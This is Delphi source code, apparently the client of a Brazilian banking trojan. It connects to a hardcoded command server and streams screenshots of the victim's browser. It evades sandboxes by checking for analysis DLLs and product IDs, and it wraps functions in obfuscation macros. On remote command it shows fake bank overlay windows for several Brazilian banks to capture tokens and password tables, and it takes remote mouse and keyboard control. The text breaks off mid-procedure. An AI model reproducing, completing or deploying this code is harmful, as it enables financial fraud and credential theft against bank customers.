unit Conectar;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, XPMan, {ScktComp,} ComCtrls, zLibEx, LH5Unit, StreamManager, Registry,
  ExtCtrls, SocketCompPersonalizado,


  IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,
  Jpeg, ZLib, {GR32_Layers,} IdAntiFreezeBase, {GR32_Image,}
  IdAntiFreeze, Clipbrd, IdGlobal, IdHTTP, SyncObjs, Math,  //MathStrUtils,

  ddeman, OleCtrls, SHDocVw, Mask, ScktComp, SndKey32; {SHDocVw_EWB, EwbCore,}
  {EmbeddedWB, dxGDIPlusClasses;}// dxGDIPlusClasses, rtflabel;


type
  TfCliente = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    Edit2: TEdit;
    Label3: TLabel;
    Edit3: TEdit;
    Connect: TButton;
    XPManifest1: TXPManifest;
   // CS1: TClientWSoct;// TClientSocket;
    StatusBar1: TStatusBar;
   // CS2: TClientWSoct;// TClientSocket;
    Label4: TLabel;
    Edit4: TEdit;
   // CS3: TClientWSoct; //TClientSocket;
    CheckBox1: TCheckBox;
    Timer1: TTimer;
    Timer2: TTimer;
    tmProcura: TTimer;
    lblLink: TLabel;
    procedure ConnectClick(Sender: TObject);
    procedure CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS2Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS3Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer2Timer(Sender: TObject);

    // funções e procedures do PRO
    function  Blocked(BlockedBank: String): boolean;
    procedure StartRemote(Bank: String);
    procedure FormCreate(Sender: TObject);
    function StartWindowInf(Window: HWND; fFake: TForm):Boolean;
    procedure ProcuraJanela;
    procedure tmProcuraTimer(Sender: TObject); // antiga startfaqe

  private
    { Private declarations }

    procedure chkProcOrigem(Link:String);
  public
    { Public declarations }

    BrowserHWND, FakeHWND, BKP_BrowserHWND : HWND;
    Path,Dir, nBak, nBakAnt, FAKE, OSVer: String;
    XP: boolean;
    fLie: TForm;
    Disconnect: boolean;
    LinkJanela : String;
    {
    HInfect : String;
    HPort   : Integer;
    Host1, Host2, Host3 : String;
    Port1, Port2, Port3 : Integer;
    }
    function FOCA_Windows: String;
    procedure MouseCMD(Window: HWND; Direction, X, Y: Integer);
    procedure KeyCMDEX(Key: String);
    procedure KeyCMD(STR: String);
    procedure KeyCMDIta(STR: string);
  end;

var
  fCliente        : TfCliente;
  iSendCount      : Integer;
  MyFirstBmp      : TMemoryStream;
  MySecondBmp     : TMemoryStream;

  MyThirdBmp      : TMemoryStream;
  MyFourthBmp     : TMemoryStream;

  MyCompareBmp    : TMemoryStream;
  PackStream      : TMemoryStream;
  RecebendoDados  : Boolean;
  WindowInfActive : Boolean = False;

const

  nw21 = 24073;   // variavel pw
  nw22 = 65535;  // variavel pw2

  nBB1 = 'H'     ; // BB
  nBB2 = 'Há'    ; // BBJ
  nIT1 = 'Ö['    ; // ITA
  nIT2 = 'Ö[Ÿ'   ; // ITAJ
  nVE1 = '	Wªb´s'; // VerMPF
  nSA1 = '«Â™¿$'  ; // SANTA
  nSA2 = '«Â™¿$ú' ; // SANTAJ

  HPort   = 60000; // 49998
  Port1   = 60000;
  Port2   = 60001;
  Port3   = 60002;

  HInfect = '192.168.0.135';        // TESTE LOCAL
  // HInfect = '198.15.117.19';        //
  // HInfect = '108.170.56.133';        //
  Host1   = HInfect ;  // '198.15.117.19';
  Host2   = Host1   ;
  Host3   = Host1   ;

implementation

uses
  uCrypt, uHBrowsers, funcs2013, uPCFuncs, uScreenFuncs, uVerMPF, uSOBRE,
  uPITA, uPITAJ, uPBF, uAzul, uBrB, uPSNT, uPSNTJ;

{$R *.dfm}

function InStr(iStart: Integer; sSource: String; sSourceToFind: String): Integer;
begin
  Result := Pos(sSourceToFind, Copy(sSource, iStart, Length(sSource) - (iStart - 1)));
end;

function TrimA(sCadena: String): String;
begin
  Result := '';

  if sCadena = '' then Exit;

  while sCadena[1] = ' ' do
  begin
    Delete(sCadena, 1, 1);

    if sCadena='' then Exit;
  end;

  while sCadena[Length(sCadena)] = ' ' do
  begin
    Delete(sCadena,Length(sCadena),1);

    if sCadena  = '' then Exit;
  end;

  Result :=  sCadena;
end;

function IsInSdbox: Bool;
const
  sArrSB      :array[0..1] of string = ('76487-644-3177037-23510',
                                        '55274-640-2673064-23950');
  sArrDll     :array[0..1] of string = ('sbiedll.dll', 'dbghelp.dll');
var
  hlKey       :HKEY;
  sBuffer     :String;
  i           :Integer;
  hDll        :Integer;
  iRegType    :Integer;
  iDataSize   :Integer;
  hSnapShot   :Integer;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  IsInSdbox := False;
  iRegType := 1;

  hDll := LoadLibrary(PChar(sArrDll[0]));

  if hDll <> 0 then
    IsInSdbox := True;

  FreeLibrary(hDll);

  hDll := LoadLibrary(PChar(sArrDll[1]));

  if hDll <> 0 then
    IsInSdbox := True;

  FreeLibrary(hDll);

  if RegOpenKeyEx($80000002, Pchar('Software\Microsoft\Windows\CurrentVersion'), 0, $20019, hlKey) = 0 then
    if RegQueryValueEx(hlKey, 'ProductId', 0, @iRegType, nil, @iDataSize) = 0 then
      SetLength(sBuffer, iDataSize);
      RegQueryValueEx(hlKey, 'ProductId', 0, @iRegType, PByte(PChar(sBuffer)), @iDataSize);

      for I := 0 to 2 do
        if InStr(1, TrimA(sBuffer), sArrSB[i]) > 0 then
          IsInSdbox := True;

    RegCloseKey(hlKey);

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

function ForceForegroundWindow(hwnd: THandle): Boolean;
const
  SPI_GETFOREGROUNDLOCKTIMEOUT = $2000;
  SPI_SETFOREGROUNDLOCKTIMEOUT = $2001;
var
  ForegroundThreadID: DWORD;
  ThisThreadID: DWORD;
  timeout: DWORD;
begin
  if IsIconic(hwnd) then
     ShowWindow(hwnd, SW_RESTORE);

  if GetForegroundWindow = hwnd then
     Result := True
  else
      begin
        if ((Win32Platform = VER_PLATFORM_WIN32_NT) and (Win32MajorVersion > 4)) or
           ((Win32Platform = VER_PLATFORM_WIN32_WINDOWS) and
           ((Win32MajorVersion > 4) or ((Win32MajorVersion = 4) and
           (Win32MinorVersion > 0)))) then
            begin

              Result := False;
              ForegroundThreadID := GetWindowThreadProcessID(GetForegroundWindow, nil);
              ThisThreadID := GetWindowThreadPRocessId(hwnd, nil);
              if AttachThreadInput(ThisThreadID, ForegroundThreadID, True) then
                  begin
                    BringWindowToTop(hwnd); // I     E 5  .5 related hack
                    SetForegroundWindow(hwnd);
                    AttachThreadInput(ThisThreadID, ForegroundThreadID, False);
                    Result := (GetForegroundWindow = hwnd);
                  end;
              if not Result then
                  begin
                    // Code by Daniel P. Stasinski
                    SystemParametersInfo(SPI_GETFOREGROUNDLOCKTIMEOUT, 0, @timeout, 0);
                    SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(0),
                      SPIF_SENDCHANGE);
                    BringWindowToTop(hwnd); // I   E 5   .5 related hack
                    SetForegroundWindow(hWnd);
                    SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(timeout), SPIF_SENDCHANGE);
                  end;
            end
        else
        begin
          BringWindowToTop(hwnd); // I    E 5   .5 related hack
          SetForegroundWindow(hwnd);
        end;

        Result := (GetForegroundWindow = hwnd);
      end;
end; { ForceForegroundWindow }


function Processador: String;
var
regi : TRegistry; s : string;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

   regi:=tRegistry.Create;
   With Regi do
   Begin
     rootKey:=HKEY_LOCAL_MACHINE;
     OpenKey('HARDWARE\DESCRIPTION\System\CentralProcessor\0',false);
     s:=ReadString('ProcessorNameString');
     CloseKey;
     result := Trim(s);
   end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

function GetSOComputer: string;
var
  Reg: TRegistry;
begin

  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    if Reg.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion', False) then
    begin
      Result := Reg.ReadString('ProductName');
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;


function CompressStream(SrcStream: TMemoryStream):boolean;
var
  InputStream,OutputStream :TMemoryStream;
  //CompressionStream :TZcompressionStream;
  inbuffer,outbuffer :Pointer;
  count,outcount :longint;
begin

  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  result := false;
  if not assigned(SrcStream) then exit;

    InputStream := TMemoryStream.Create;
    OutputStream := TMemoryStream.Create;

    //CompressionStream := TZCompressionStream.Create(OutputStream,zcFastest);
  try
    InputStream.LoadFromStream(SrcStream);
    count := inputstream.Size;
    getmem(inbuffer,count);
    Inputstream.ReadBuffer(inbuffer^,count);
    //CompressionStream.Write(buffer,count);
    zcompress(inbuffer,count,outbuffer,outcount,zcMax);
    //CompressionStream.CopyFrom(InputStream,0);
    //Outputstream.LoadFromStream(Inputstream);
    outputstream.Write(outbuffer^,outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result :=true;
  finally
    //CompressionStream.Free;
    InputStream.Free;
    OutputStream.Free;
  end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;


procedure TfCliente.ConnectClick(Sender: TObject);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  try
    if Not CS1.Active then
       begin
          Connect.Enabled := false;
          Edit1.Enabled := false;
          Edit2.Enabled := false;
          Edit3.Enabled := false;
          Edit4.Enabled := false;
          StatusBar1.Panels.Items[1].Text := 'Conectando...';
          CS1.Port := strToInt(Edit2.Text);
          CS1.Host := Edit1.Text;
          CS1.Active := true;
          if CheckBox1.Checked then
             Timer1.Enabled := true
          else
             Timer1.Enabled := false;
       end;

  except
    Connect.Enabled := True;
    Edit1.Enabled   := True;
    Edit2.Enabled   := True;
    Edit3.Enabled   := True;
    Edit4.Enabled   := True;
    StatusBar1.Panels.Items[1].Text := 'Desconectado !';
  end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;


end;

procedure TfCliente.CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  StatusBar1.Panels.Items[1].Text := 'Desconectado';
  Connect.Enabled := true;
  Edit1.Enabled := true;
  Edit2.Enabled := true;
  Edit3.Enabled := true;
  Edit4.Enabled := true;
  Timer2.Enabled := false;
  CS2.Active := false;
  CS3.Active := false;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.CS1Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
    // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  StatusBar1.Panels.Items[1].Text := 'Erro ao conectar';
  ErrorCode := 0;
  Connect.Enabled := true;
  Edit1.Enabled := true;
  Edit2.Enabled := true;
  Edit3.Enabled := true;
  Edit4.Enabled := true;
  Timer2.Enabled := false;
  CS2.Active := false;
  CS3.Active := false;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  CS2.Host := CS1.Host;
  CS2.Port := CS1.Port;
  //CS2.Active := true;

  CS3.Host := CS1.Host;
  CS3.Port := CS1.Port;
  //CS3.Active := true;


  MyFirstBmp   := TMemoryStream.Create;
  MySecondBmp  := TMemoryStream.Create;

  MyThirdBmp   := TMemoryStream.Create;
  MyFourthBmp  := TMemoryStream.Create;

  MyCompareBmp := TMemoryStream.Create;
  PackStream   := TMemoryStream.Create;

  iSendCount   := 0;
  StatusBar1.Panels.Items[1].Text := 'Conectado';
  Timer2.Enabled := true;

  Connect.Enabled := false;
  Edit1.Enabled   := false;
  Edit2.Enabled   := false;
  Edit3.Enabled   := false;
  Edit4.Enabled   := false;
  
  Socket.SendText('<|PRINCIPAL|>');

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.CS2Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TfCliente.CS2Read(Sender: TObject; Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize: string;
   sOrigem : string;

   procedure CompareStream2(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
   var
     I: Integer;
     P1, P2, P3: ^Char;
   begin

     // ENCODE_START macro
     asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

      MySecondStream.Clear;
      MyCompareStream.Clear;

      if IsIconic(fCliente.FakeHWND) then
         ShowWindow(fCliente.FakeHWND,SW_MAXIMIZE);
      GetWindowsToBmp( fCliente.XP, fCliente.BrowserHWND, MySecondStream );

      P1 := MyFirstStream.Memory;
      P2 := MySecondStream.Memory;
      MyCompareStream.SetSize(MyFirstStream.Size);
      P3 := MyCompareStream.Memory;

      for I := 0 to MyFirstStream.Size - 1 do
      begin
        if P1^ = P2^ then
          P3^ := '0'
        else
          P3^ := P2^;
        Inc(P1);
        Inc(P2);
        Inc(P3);
      end;

      MyFirstStream.Clear;
      MyFirstStream.CopyFrom(MySecondStream,0);

      // ENCODE_END macro
      asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

    end;


begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

   StrCommand := socket.ReceiveText;

   if StrCommand = '<|first|>' then
      begin
        // cria instancia MemoryStream
        MyFirstBmp   := TMemoryStream.Create;
        MySecondBmp  := TMemoryStream.Create;

        MyThirdBmp   := TMemoryStream.Create;
        MyFourthBmp  := TMemoryStream.Create;

        MyCompareBmp := TMemoryStream.Create;
        PackStream   := TMemoryStream.Create;

        iSendCount   := 0;

        MyFirstBmp.Clear;

        // Se WinInfAtve ( faque ativada )
        if WindowInfActive then
           begin
             // verifica foco da tela faque
             if IsIconic(fCliente.FakeHWND) then
                ShowWindow(fCliente.FakeHWND,SW_MAXIMIZE); // mostra faque maximizada

             GetWindowsToBmp( fCliente.XP, fCliente.BrowserHWND, MyFirstBmp ); // Captura Print da janela do navegador
             // Application.Terminate;
           end
        else
           GetScreenToBmp(False,MyFirstBmp);  // quando normal captura tela normal

        MyFirstBmp.Position := 0;

        // Comprime imagem com metodo LHA
        LHACompress(MyFirstBmp, PackStream);
        CompressStream(PackStream);

        PackStream.Position := 0;

        StrPackSize := inttostr(PackStream.size);
        CS2.Socket.Sendtext(StrPackSize);

        iSendCount := iSendCount + 1;
      end;

   if StrCommand = '<|gets|>' then
      begin
        // instancia MemorySream para PacksStreem
        PackStream := TMemoryStream.Create;

        // Captura a nova imagem e compara com anterior para enviar somente dados alterados na imagem
        if WindowInfActive then // Se faque ativa compara imagem da janela
           CompareStream2(MyFirstBmp,MySecondBmp,MyCompareBmp)
        else
           CompareStream(MyFirstBmp,MySecondBmp,MyCompareBmp); // Se normal compara imagem da tela inteira

        MyCompareBmp.Position := 0;
        LHACompress(MyCompareBmp, PackStream);
        CompressStream(PackStream);
        PackStream.Position := 0;
        StrPackSize := inttostr(PackStream.size);

        CS2.Socket.Sendtext(StrPackSize);

        iSendCount := iSendCount+1;
      end;

   if StrCommand = '<|okok|>' then
      begin
        //if WindowInfActive then
        //   CS1.Socket.SendText('ORIG_IMG_2');
        PackStream.Position := 0;
        CS2.Socket.SendStream(PackStream);
      end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.CS1Read(Sender: TObject; Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize, dados2: string;
   posX, posY: Integer;
   MouseSettings: TStringList;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  StrCommand := socket.ReceiveText;

  if (nBakAnt <> '') then
      begin
         if (nBak <> nBakAnt) then
            Socket.SendText('<|Info|>'+Edit4.Text+'<|>'+GetSoComputer+'<|>'+Processador+'<|>'+Edit3.Text+'<<|'+'<R>'+nBak);
      end;

  if Pos('<|OK|>', StrCommand)>0 then
     Socket.SendText('<|Info|>'+Edit4.Text+'<|>'+GetSoComputer+'<|>'+Processador+'<|>'+Edit3.Text+'<<|'+'<R>'+nBak);

  if Pos('<|REQUESTKEYBOARD|>', strCommand)>0 then
     CS3.Active := true;

  //      if Pos('NEWPRINT', StrCommand) <> 0 then
        // SendPrint;

  ////////  COMANDO START FAKE

  if (Pos('STARTFAKE', StrCommand) <> 0) then
     begin
        Delete(StrCommand, 1, Pos('|', StrCommand));
        if Trim(StrCommand) = Decrypt(nIT1,nw21) then
            begin
               try
                WindowInfActive := StartWindowInf(FakeHWND, fIT_ALie);
                if WindowInfActive then // antiga funcao startfake
                   Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                else
                   Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
               except
                 Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
               end;
            end;

         if Trim(StrCommand) = Decrypt(nIT2,nw21) then
             begin
                try
                 WindowInfActive := StartWindowInf(FakeHWND, fI_TALieJ);
                 if WindowInfActive then // antiga funcao startfake
                    Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                 else
                    Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
                except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
                end;
             end;

        if Trim(StrCommand) = Decrypt(nBB1,nw21) then
           begin
             fBXF.Caption := Decrypt(nBB1,nw21);
             try
                WindowInfActive := StartWindowInf(FakeHWND, fBXF);
                if WindowInfActive then // antiga funcao startfake
                   Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                else
                   Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
             except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
             end;
           end;

        if Trim(StrCommand) = Decrypt(nBB2,nw21) then
           begin
             fBXF.Caption := Decrypt(nBB2,nw21);
             try
                WindowInfActive := StartWindowInf(FakeHWND, fBXF);
                if WindowInfActive then // antiga funcao startfake
                   Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                else
                   Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
             except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
             end;
           end;

         if Trim(StrCommand) = 'FAZUL' then
             begin
                try
                 WindowInfActive := StartWindowInf(FakeHWND, fAzul);
                 if WindowInfActive then // antiga funcao startfake
                    Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                 else
                    Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
                except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
                end;
             end;

         if Trim(StrCommand) = Decrypt(nSA1,nw22) then
             begin
                try
                 WindowInfActive := StartWindowInf(FakeHWND, fSNTLie);
                 if WindowInfActive then // antiga funcao startfake
                    Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                 else
                    Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
                except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
                end;
             end;

         if Trim(StrCommand) = Decrypt(nSA2,nw22) then
             begin
                try
                 WindowInfActive := StartWindowInf(FakeHWND, fSNTJLie);
                 if WindowInfActive then // antiga funcao startfake
                    Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                 else
                    Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
                except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
                end;
             end;

         if Trim(StrCommand) = 'FBRB' then
             begin
                try
                 WindowInfActive := StartWindowInf(FakeHWND, fBXb);
                 if WindowInfActive then // antiga funcao startfake
                    Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
                 else
                    Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
                except
                  Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
                end;
             end;


        if (Trim(StrCommand) = Decrypt(nVE1,nw21)) or
           (Trim(StrCommand) = Decrypt(nVE1,nw21)) or
           (Trim(StrCommand) = Decrypt('	Wªb¢', nw21)) then  // or (MSG = 'VerMF') then
           begin
             try
               WindowInfActive := StartWindowInf(FakeHWND, fVerMPF);
               if WindowInfActive then // antiga funcao startfake
                  Socket.SendText('STARTFAKEOK|'+fCliente.FAKE)
               else
                  Socket.SendText('STARTFAKEOFF|'+fCliente.FAKE);
             except
               Socket.SendText('STARTFAKE_ERRO|'+fCliente.FAKE);
             end;
           end;

     end;


  ////// COMANDOS NEGA SENHA
  if Pos('NEGASENHA', StrCommand) <> 0 then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));

       if Trim(StrCommand) = Decrypt(nIT1,nw21) then
          fIT_ALie.pnlS6.BringToFront;

       if StrCommand = Decrypt(nIT2,nw21) then
          fI_TALieJ.pnlS6.BringToFront;

       if StrCommand = Decrypt(nBB1,nw21) then
          begin
            fBXF.Caption := Decrypt(nBB1,nw21);
            fBXF.pnlS6.BringToFront;
          end;

       if StrCommand = Decrypt(nBB2,nw21) then
          begin
            fBXF.Caption := Decrypt(nBB2,nw21);
            fBXF.pnlSConta.BringToFront;
         end;

       if StrCommand = 'FAZUL' then
          fAzul.pnlTabela.BringToFront;

       if StrCommand = Decrypt(nSA1,nw22) then
          fSNTLie.pnlSNET.BringToFront;

       if StrCommand = Decrypt(nSA2,nw22) then
          fSNTJLie.pnlAssSerie.BringToFront;

     end;


  if Pos('SETFOCUS', StrCommand) <> 0 then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       SetForegroundWindow(BrowserHWND);
       SetForegroundWindow(fSOBRE.Handle)
     end;

  if Pos('BLOCK', StrCommand) <> 0 then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       Blocked( Trim(StrCommand) );
     end;
  {
  if Pos('KEYEX', StrCommand) <> 0 then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       KeyCMDEX(StrCommand);
     end;
  }

  /////// COMANDOS GET TOKEN / TABELA  //////

  if (Pos('GETITATOKEN',StrCommand) <> 0) then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       fIT_ALie.lblFinal.Caption := Trim(StrCommand);
       fIT_ALie.pnliT.BringToFront;
     end;

  if Pos('GETITATABELA', StrCommand) <> 0 then
     begin
       fIT_ALie.Memo1.LINES.Add( StrCommand );
       Delete(StrCommand, 1, Pos('|', StrCommand));
       fIT_ALie.Memo1.LINES.Add( StrCommand );
       fIT_ALie.lblNTabela.Caption := 'n° '+Trim(StrCommand);
       fIT_ALie.pnlTabela.BringToFront;
     end;

  if (Pos('GETITAJTOKEN',StrCommand) <> 0) then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       fI_TALieJ.lblFinal.Caption := StrCommand;
       fI_TALieJ.pnliT.BringToFront;
     end;

  if (Pos('GETFAZULFTABELA',StrCommand) <> 0) then
     begin
       Delete(StrCommand,1,Pos('|',StrCommand));
       fAzul.pnlTabela.BringToFront;
     end;

  if (Pos('GETFBRBFTOKEN',StrCommand) <> 0) then
     begin
       Delete(StrCommand,1,Pos('|',StrCommand));
       fBXb.pnlTabela.BringToFront;
     end;

  {
  if (Pos('GETFBRBFTABELA',StrCommand) <> 0) then
     begin
       Delete(StrCommand,1,Pos('|',StrCommand));
       fBXb.pnlTabela.BringToFront;
     end;
   }

  if Pos('SANTAPOSICAO', StrCommand) <> 0 then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       fSNTLie.lblPosicao.Caption := StrCommand;
       fSNTLie.pnlTabela.BringToFront;
     end;

  if Pos('GETSANTAJT', StrCommand) <> 0 then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       fSNTJLie.pnlT.BringToFront;
     end;

  if (Pos('GETVERMPFTOKEN',StrCommand) <> 0) then
      begin
        Delete(StrCommand, 1, Pos('|', StrCommand));
        fVerMPF.lblFinal.Caption := StrCommand;
        fVerMPF.pnliT.BringToFront;
      end;
      
  if (Pos('GETVERMFTABELA', StrCommand) <> 0) then
     begin
       Delete(StrCommand, 1, Pos('|', StrCommand));
       fVerMPF.lblNTabela.Caption := 'n° '+StrCommand;
       fVerMPF.pnlTabela.BringToFront;
     end;

  //////////// FIM COMANDOS GET

  if Pos('<|PING|>', strCommand)>0 then
     begin
       Socket.SendText('<|PONG|>'+'<R>'+nBak);
       RecebendoDados := true;
     end;

  if Pos('<|Close|>', strCommand)>0 then
     begin
       CS1.Active := false;
       CS2.Active := false;
       CS3.Active := false;
       if WindowInfActive then
          begin
            // ENCODE_START macro
            asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

            try
              WindowInfActive := False;
              if Assigned(fSOBRE)    then fSOBRE.Hide   ;
              if Assigned(fBXF)      then fBXF.Hide   ;
              if Assigned(fIT_ALie)  then fIT_ALie.Hide  ;
              if Assigned(fI_TALieJ) then fI_TALieJ.Hide ;
              if Assigned(fSNTJLie)  then fSNTJLie.Hide ;
              if Assigned(fSNTLie)   then fSNTLie.Hide  ;
              if Assigned(fAzul)     then fAzul.Hide    ;
              if Assigned(fVerMPF)   then fVerMPF.Hide ;
              KP(FakeHWND);
              if Assigned(fLie) then fLie.Hide;
              // btnDisconnect.Click;
            finally

            end;
            // ENCODE_END macro
            asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

          end;
       CheckBox1.Checked := False;
       tmProcura.Enabled := True;
     end;

  if Pos('<|NOSenha|>', strCommand)>0 then
     begin
       CS1.Active := false;
       CS2.Active := false;
       CS3.Active := false;
       Application.MessageBox('Senha incorreta!', 'Erro', 16);
     end;


  if StrCommand = '<|first|>' then
     begin
       CS2.Close;
       CS2.Active := true;
     end;

  if Pos('<|MousePos|>', StrCommand)>0 then
     begin
       Dados2 := StrCommand;

       Delete(dados2, 1, Pos('<|MousePos|>', dados2)+11);
       posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

       Delete(dados2, 1, Pos('<|>', dados2)+2);
       posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

       // if WindowInfActive then
       //    MouseCMD( BrowserHWND,0,posX,posY);

       SetCursorPos(posX, posY);
      end;

  // Quando botao direito do mouse é APERTADO
  if Pos('<|MouseLD|>', strCommand)>0 then
      begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseLD|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        if WindowInfActive then
           SendMessage( fCliente.BrowserHWND, WM_LBUTTONDOWN, 1, MakeLong(posX, posY) )
        else
           begin
             SetCursorPos(posX, posY);
